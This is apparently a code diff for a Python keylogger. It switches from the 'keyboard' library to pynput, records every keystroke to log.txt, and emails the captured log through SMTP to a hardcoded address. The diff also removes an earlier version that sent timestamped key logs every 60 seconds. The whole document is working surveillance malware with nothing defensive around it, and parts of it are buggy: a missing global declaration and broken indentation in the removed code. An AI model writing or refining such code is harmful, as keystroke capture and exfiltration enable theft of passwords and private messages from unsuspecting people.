@@ -1,13 +1,42 @@
-import keyboard
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from pynput.keyboard import Key, Listener
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "your_email@example.com"
 EMAIL_PASSWORD = "your_email_password"
 
-def send_email(message):
+keys = []
+
+def on_press(key):
+    global keys
+    keys.append(key)
+    write_file(keys)
+    try:
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
+
+def on_release(key):
+    if key == Key.esc:
+        send_email(keys)
+        keys = []
+        return False
+
+def write_file(keys):
+    with open("log.txt", "w") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write("\n")
+            elif k.find("Key") == -1:
+                f.write(k)
+            
+def send_email(keys):
+    message = ""
+    with open("log.txt", "r") as f:
+        message = f.read()
     msg = MIMEMultipart()
     msg['From'] = EMAIL_ADDRESS
     msg['To'] = EMAIL_ADDRESS
@@ -19,26 +48,5 @@ def send_email(message):
     server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
     server.quit()
 
-    def on_press(key):
-    try:
-        current_time = time.time()
-        with open("logs.txt", "a") as f:
-            f.write(str(key) + " " + str(current_time) + "\n")
-        # check if it's time to send the email
-        if (current_time - start_time) >= SEND_REPORT_EVERY:
-            with open("logs.txt", "r") as f:
-                logs = f.read()
-            send_email(logs)
-            # reset the start time and clear the logs file
-            start_time = current_time
-            open("logs.txt", "w").close()
-    except:
-        pass
-      
-def start():
-    keyboard.on_press(on_press)
-    keyboard.wait()
-    
-    if __name__ == '__main__':
-    start()
-
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
